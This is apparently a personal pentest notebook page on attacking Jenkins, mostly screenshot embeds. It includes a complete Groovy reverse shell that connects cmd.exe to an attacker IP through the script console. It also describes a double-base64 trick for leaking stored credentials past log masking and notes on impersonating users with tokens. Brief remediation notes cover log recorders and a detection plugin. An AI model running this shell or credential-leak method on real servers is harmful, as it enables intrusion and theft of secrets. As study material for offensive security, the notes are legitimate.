
The default user credentials are admin and password.

/var/lib/jenkins home dir?

jenkins wp script console uses groovy - groovy revsh.groovy
```groovy
String host="10.18.21.236";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![[Images/Pasted image 20240606170047.png]]

---
![[Images/Pasted image 20250620222710.png]]
![[Images/Pasted image 20250620222749.png]]
![[Images/Pasted image 20250620222826.png]]
![[Images/Pasted image 20250620222915.png]]
..
![[Images/Pasted image 20250620222947.png]]
![[Images/Pasted image 20250620222958.png]]

![[Images/Pasted image 20250620223026.png]]
![[Images/Pasted image 20250620223100.png]]

![[Images/Pasted image 20250620223114.png]]

plaintext creds in github common

global creds store
![[Images/Pasted image 20250620223201.png]]
![[Images/Pasted image 20250620223224.png]]

create new project
use secret te
![[Images/Pasted image 20250620223311.png]]
![[Images/Pasted image 20250620223328.png]]

![[Images/Pasted image 20250620223347.png]]

double base64 encoding to trick jenkins (won't show clear text paswd in logs)

![[Images/Pasted image 20250620223452.png]]

![[Images/Pasted image 20250620223530.png]]
base 64 decode in browser - nice trick

can now log in as admin, go to script console
![[Images/Pasted image 20250620223803.png]]
![[Images/Pasted image 20250620223908.png]]

add token for yourself (or other user, to impersonate)
![[Images/Pasted image 20250620224024.png]]
![[Images/Pasted image 20250620224104.png]]

remediations, jenkins logger

![[Images/Pasted image 20250620224317.png]]
![[Images/Pasted image 20250620224403.png]]

system log, add log recorder
![[Images/Pasted image 20250620224445.png]]
![[Images/Pasted image 20250620224559.png]]
came from script console

can also build your own plugin
![[Images/Pasted image 20250620224734.png]]

Also a detection toolkit plugin exists
![[Images/Pasted image 20250620224810.png]]

![[Images/Pasted image 20250620225141.png]]






